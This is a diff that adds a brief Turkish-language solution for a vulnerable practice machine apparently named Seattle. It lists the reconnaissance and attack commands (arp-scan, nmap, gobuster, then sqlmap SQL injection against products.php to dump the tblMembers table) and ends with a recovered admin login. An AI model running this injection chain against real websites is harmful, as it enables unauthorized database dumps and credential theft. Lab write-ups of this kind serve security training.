@@ -1,0 +1,8 @@
+SEATTLE MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.39 bulundu.
+2 - nmap -sT -A 192.168.2.39
+3 - gobuster dir -u http://192.168.2.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - sqlmap -u 'http://192.168.2.39/products.php?type=1' --random-agent --dbs
+5 - sqlmap -u 'http://192.168.2.39/products.php?type=1' --random-agent -D seattle --tables
+6 - sqlmap -u 'http://192.168.2.39/products.php?type=1' --random-agent -D seattle -T tblMembers --dump
+7 - admin@seattlesounds.net : Assasin1
